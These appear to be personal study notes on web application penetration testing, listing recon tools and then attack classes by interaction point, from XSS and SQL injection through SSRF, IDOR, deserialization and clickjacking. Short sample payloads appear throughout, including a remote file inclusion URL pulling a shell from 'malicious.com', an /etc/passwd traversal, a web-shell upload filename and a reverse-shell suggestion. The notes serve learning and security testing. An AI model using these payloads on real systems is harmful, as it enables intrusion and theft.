- Waybackurl (https://web.archive.org/)
- google dorking [Google dorking](../../CyberSecurity/Tools/Google%20dorking)
- Check js files for credentials leakage[https://github.com/GerbenJavado/LinkFinder]
- Check [Comprehensive Table of Web Application Attack Vectors and Vulnerabilities](../../CyberSecurity/General/Comprehensive%20Table%20of%20Web%20Application%20Attack%20Vectors%20and%20Vulnerabilities)






**END-POINT FINDINGS:**

->  ***"API End point"***  findings are the most crucial play in the game, Use js (or) Github (or) Google Dorks to find the end points
->  ***"Robots.txt"***  check with the hidden url's
->  crt.sh, shodan





---
Just to know, for more details refer [Comprehensive Table of Web Application Attack Vectors and Vulnerabilities](../../CyberSecurity/General/Comprehensive%20Table%20of%20Web%20Application%20Attack%20Vectors%20and%20Vulnerabilities)
### **Attack Categories by Interaction Point / Functionality**

This list is designed to guide your thought process when examining a specific part of a system.

---

#### **1. Any Text Input Field (e.g., Search Bars, Comment Sections, User Registration Forms, Contact Forms, Profile Fields, Chat Applications)**

**Core Principle:** Whenever user-supplied text is processed, stored, or displayed.

- **Cross-Site Scripting (XSS)**
    
    - **Why here?** If the application doesn't properly sanitize (clean) or encode (convert special characters into harmless entities) the input before displaying it back to the user or to other users. Your injected HTML/JavaScript becomes part of the webpage.
        
    - **Types:** Reflected, Stored, DOM-based (DOM-based can be more complex, involving client-side JavaScript processing).
        
- **SQL Injection (SQLi)**
    
    - **Why here?** If the input is used to construct a SQL query for a database without using parameterized queries (prepared statements). Your input breaks out of the intended data field and becomes part of the SQL command.
        
    - **Examples:** Login forms, search filters, any data submission that populates a database.
        
- **Command Injection (OS Command Injection)**
    
    - **Why here?** If the application uses your input directly in a server-side operating system command (e.g., for file operations, network diagnostics like `ping`). Your input breaks out of the data field and becomes an OS command.
        
    - **Examples:** Input for a "ping" utility, a "file conversion" service, "system diagnostics."
        
- **Server-Side Template Injection (SSTI)**
    
    - **Why here?** If the input is placed directly into a server-side template (e.g., Jinja2, Twig, Velocity) that is rendered without proper escaping. Your input becomes template code that the server executes.
        
    - **Examples:** Personalized email templates, custom report generators, dynamic content pages where admins or specific users can add text.
        
- **NoSQL Injection**
    
    - **Why here?** If the input is used to construct queries for NoSQL databases (e.g., MongoDB, Redis) without proper sanitization. Similar to SQLi but with NoSQL-specific syntax.
        
    - **Examples:** Applications using MongoDB for user data, key-value stores.
        
- **Log Forging / Log Injection**
    
    - **Why here?** If the input is logged directly to a file without sanitizing newline characters. You can inject false log entries to obscure your tracks or consume disk space.
        
    - **Examples:** Username fields in login attempts, any field that might be written to an audit log.
        
- **LDAP Injection**
    
    - **Why here?** If the application constructs LDAP queries (e.g., for user authentication against an LDAP directory) using unsanitized user input.
        
    - **Examples:** Login forms connecting to an LDAP directory, employee search tools in an internal portal.
        
- **XPath Injection**
    
    - **Why here?** If the application processes XML data and constructs XPath queries based on user input without proper sanitization.
        
    - **Examples:** XML-based search functions, data retrieval from XML documents.
        

---

#### **2. File Upload Functionality (e.g., Profile Pictures, Document Uploads, Attachment Uploads)**

**Core Principle:** When the application allows users to provide files that are stored or processed on the server.

- **Arbitrary File Upload / Web Shell Upload**
    
    - **Why here?** If the application has weak file type validation (only checking extension or Content-Type header, not actual content) and saves the file to a web-accessible, executable directory. Try **REVERSE SHELL** and try accessing the root modules or make any file changes or access other files.
        
    - **Examples:** Uploading a `shell.php` disguised as `image.jpg`.
        
- **XML Injection (within SVG)**
    
    - **Why here?** If SVG (Scalable Vector Graphics) files are supported and the XML parser used to process them is vulnerable to XXE. Also for XSS if the SVG is rendered client-side without sanitization.
        
    - **Examples:** Uploading a malicious SVG with XXE payload or embedded JavaScript.
        
- **Image Processing Vulnerabilities (e.g., ImageMagick, GD Library flaws)**
    
    - **Why here?** If the application uses third-party libraries to resize, crop, or process uploaded images, and these libraries have known vulnerabilities that can be triggered by malformed image files.
        
    - **Examples:** Uploading a specially crafted image that exploits a buffer overflow or command injection in the image processing library.
        
- **Zip Bomb / Image Bomb (DoS)**
    
    - **Why here?** If the application doesn't limit the size of the uncompressed file or the resources (CPU, memory) consumed during processing (e.g., decompression, parsing a complex image format).
        
    - **Examples:** Uploading a highly compressed `.zip` file that expands to terabytes, or an image file with excessive nested entities.
        
- **Exif Data Injection (for XSS)**
    
    - **Why here?** If the application extracts and displays metadata (EXIF data) from uploaded images without proper sanitization.
        
    - **Examples:** Injecting an XSS payload into the "Artist" or "Copyright" field of a JPEG's EXIF data.
        
- **Directory Traversal (Path Traversal)**
    
    - **Why here?** If the application constructs the save path or filename using unsanitized user input, allowing `../` sequences to move outside the intended upload directory.
        
    - **Examples:** Uploading a file named `../../../../web/shell.php` to write to the web root.
        

---

#### **3. URL Parameters / Query Strings (e.g., `?id=123`, `?q=searchterm`, `?redirect_to=`)**

**Core Principle:** Any data passed directly in the URL that the server or client-side script processes.

- **Open Redirect**
    
    - **Why here?** If a URL parameter is used to redirect the user to another page without proper validation of the target URL.
        
    - **Examples:** `https://example.com/login?redirect_to=http://malicious.com` (for phishing).
        
- **Server-Side Request Forgery (SSRF)**
    
    - **Why here?** If the application fetches content from a URL provided in a parameter (e.g., for importing data, image loading, RSS feeds).
        
    - **Examples:** `https://example.com/fetch_data?url=http://localhost/admin` (to access internal admin panel).
        
- **Local File Inclusion (LFI) / Remote File Inclusion (RFI)**
    
    - **Why here?** If a URL parameter specifies a file to be included or executed by the server, and input validation is weak.
        
    - **Examples:** `https://example.com/page.php?file=../../../../etc/passwd` (LFI to read files).
        
    - `https://example.com/page.php?file=http://malicious.com/shell.txt` (RFI to execute remote code).
        
- **HTTP Parameter Pollution (HPP)**
    
    - **Why here?** If the application handles multiple parameters with the same name in an unexpected way, potentially bypassing input validation or altering application logic.
        
    - **Examples:** `?item=1&item=2` might behave differently depending on how the backend processes duplicate parameters.
        
- **URL-based XSS (Reflected/DOM-based)**
    
    - **Why here?** If URL parameters are directly reflected into the HTML without encoding, or if client-side JavaScript processes URL parts insecurely (e.g., `document.URL`, `window.location.hash`).
        
    - **Examples:** `https://example.com/search?query=<script>alert(1)</script>`
        

---

#### **4. Authentication and Authorization Systems (e.g., Login Forms, User Management, Access Controls)**

**Core Principle:** How users prove their identity and what they are allowed to do.

- **Brute-Force Attacks**
    
    - **Why here?** If there are no rate limits, account lockout policies, or CAPTCHAs on login forms.
        
    - **Examples:** Trying thousands of username/password combinations.
        
- **Credential Stuffing**
    
    - **Why here?** If users reuse passwords across multiple services, and the site doesn't detect or prevent login attempts with credentials leaked from other breaches.
        
    - **Examples:** Using lists of known username/password pairs from data breaches.
        
- **Session Hijacking / Session Fixation**
    
    - **Why here?** If session IDs are predictable, transmitted insecurely (HTTP instead of HTTPS), or the application doesn't issue a new session ID after successful login (fixation).
        
    - **Examples:** Stealing a session cookie to impersonate a user.
        
- **Broken Access Control / IDOR (Insecure Direct Object Reference)**
    
    - **Why here?** If authorization checks are not properly implemented at the server-side, allowing users to access or modify resources by changing an ID in a request.
        
    - **Examples:** Changing `order_id=123` to `order_id=124` to view another customer's order.
        
- **Privilege Escalation**
    
    - **Why here?** Flaws in roles, permissions, or system configurations that allow a low-privileged user to gain higher privileges (e.g., becoming an administrator).
        
    - **Examples:** Exploiting a vulnerability to execute code as a system user, then escalating to root.
        

---

#### **5. API Endpoints (REST, SOAP, GraphQL, gRPC)**

**Core Principle:** Programmatic interfaces for data exchange, often distinct from the web UI.

- **All Injection Attacks (SQLi, XSS, Command, etc.)**
    
    - **Why here?** If API inputs (JSON, XML, URL parameters) are not properly validated or sanitized before being processed by backend systems.
        
    - **Examples:** Injecting SQL into a JSON field that updates a database.
        
- **Broken Object Level Authorization (BOLA / IDOR)**
    
    - **Why here?** If API endpoints that accept object IDs (e.g., `/api/v1/users/123`) do not strictly verify if the _authenticated user_ has permission to access _that specific ID_.
        
    - **Examples:** An authenticated user changing `/api/v1/orders/500` to `/api/v1/orders/501` to view another user's order.
        
- **Mass Assignment / Excessive Data Exposure**
    
    - **Why here?** If API endpoints allow clients to update object properties that they shouldn't (Mass Assignment), or if API responses include more data than necessary (Excessive Data Exposure).
        
    - **Examples:**
        
        - **Mass Assignment:** Sending `{"isAdmin": true}` in a user update request when the client should not be able to set admin status.
            
        - **Excessive Data Exposure:** An API returning a user's `password_hash` along with their public profile data.
            
- **Broken Function Level Authorization**
    
    - **Why here?** If API endpoints that perform privileged actions (e.g., delete user, change settings) do not properly verify the calling user's permissions.
        
    - **Examples:** A regular user calling `/api/v1/admin/delete_user/123` and the API not checking if the user is truly an admin.
        
- **Rate Limiting Bypass**
    
    - **Why here?** If API endpoints (especially login, password reset, or resource creation) do not have robust rate limiting, allowing for brute-force or resource exhaustion.
        
    - **Examples:** Rapidly requesting password reset tokens to exhaust a user's email inbox, or quickly signing up thousands of fake accounts.
        
- **GraphQL Specific Attacks:**
    
    - **Introspection Queries:** If introspection is enabled in production, an attacker can query the schema to learn about all available data and operations.
        
    - **Batching/Nested Queries:** Crafting overly complex or deeply nested queries that cause resource exhaustion on the server (DoS).
        

---

#### **6. Network Interaction (Client-side and Server-side)**

**Core Principle:** How devices communicate over a network, and how clients (browsers) interact with web applications.

- **Cross-Site Request Forgery (CSRF)**
    
    - **Why here?** Relies on the user's browser automatically sending cookies with requests. If a vulnerable application doesn't implement anti-CSRF tokens, an attacker's crafted link can trigger actions in the victim's browser.
        
    - **Examples:** A malicious website having an `<img>` tag that points to `yoursite.com/transfer_money?amount=1000`.
        
- **Man-in-the-Middle (MITM)**
    
    - **Why here?** On insecure networks (e.g., public Wi-Fi) or via techniques like ARP Spoofing, DNS Spoofing, or SSL stripping.
        
    - **Examples:** An attacker intercepting traffic on an unencrypted Wi-Fi network to steal credentials.
        
- **Session Hijacking (Network Level)**
    
    - **Why here?** If session tokens are transmitted over unencrypted HTTP, making them visible to network sniffers.
        
    - **Examples:** Capturing an HTTP session cookie on a public Wi-Fi network.
        
- **DDoS / DoS**
    
    - **Why here?** Targets the availability of the server or network infrastructure. Can be at various layers (network, application).
        
    - **Examples:** Flooding a web server with an overwhelming number of requests.
        

---

#### **7. Error Messages & Logs**

**Core Principle:** How the application handles and displays errors, and what information it logs.

- **Information Disclosure (via Error Messages)**
    
    - **Why here?** If detailed error messages (e.g., stack traces, database errors, internal file paths) are displayed to users in production.
        
    - **Examples:** A database connection error showing the database username and password, or a file not found error revealing the full server path.
        
- **Log Forging (revisit)**
    
    - **Why here?** If user input is directly written to logs without sanitization, especially for newline characters.
        
    - **Examples:** Injecting fake log entries into web server access logs to hide malicious activity.
        

---

#### **8. Data Serialization/Deserialization**

**Core Principle:** When an application converts complex data structures into a format for storage or transmission, and then reconstructs them.

- **Insecure Deserialization**
    
    - **Why here?** If the application deserializes data from untrusted sources without robust validation, allowing an attacker to inject malicious objects that execute code during deserialization.
        
    - **Examples:** A malicious serialized object sent in a cookie or API request leading to remote code execution.
        

---

#### **9. Miscellaneous / Other**

- **HTTP Host Header Attacks**
    
    - **Why here?** If the application uses the `Host` header for security decisions (e.g., generating password reset links, redirect URLs) without validating it against a whitelist.
        
    - **Examples:** Web cache poisoning, password reset poisoning, routing internal requests.
        
- **Race Conditions**
    
    - **Why here?** In multi-threaded or concurrent applications where the order of operations can be manipulated, allowing an attacker to exploit a brief window of vulnerability.
        
    - **Examples:** Exploiting a momentary state where a user's account balance is updated before a proper check, allowing double spending.
        
- **Clickjacking (UI Redress Attack)**
    
    - **Why here?** If a website doesn't use proper security headers (like `X-Frame-Options` or CSP `frame-ancestors`) to prevent it from being embedded in an iframe on another site.
        
    - **Examples:** Overlaying an invisible malicious iframe over a legitimate button (e.g., "Buy Now"), tricking the user into clicking it on the hidden site.
        

---
